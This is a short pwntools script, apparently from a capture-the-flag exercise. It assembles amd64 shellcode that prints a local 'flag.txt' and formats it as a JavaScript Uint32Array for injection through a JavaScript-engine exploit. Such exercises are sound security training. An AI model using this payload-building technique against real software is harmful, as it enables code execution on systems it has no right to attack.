from pwn import *
context.arch = 'amd64'

# swap endian
def se(inp):
    assert len(inp) == 8
    return inp[6:8]+inp[4:6]+inp[2:4]+inp[0:2]


shellcode  = asm(shellcraft.amd64.cat("./flag.txt"))

hex_str = shellcode.hex()
# add some padding
hex_str = hex_str + "0"*(8 - (len(hex_str)%8))


print("var shellcode = new Uint32Array([", end='')
for i in range(0, len(hex_str), 8):
    if i % 40 == 0:
        print("\n\t", end='')
    print(f"0x{se(hex_str[i:i+8])}, ", end='')
print("\n])")
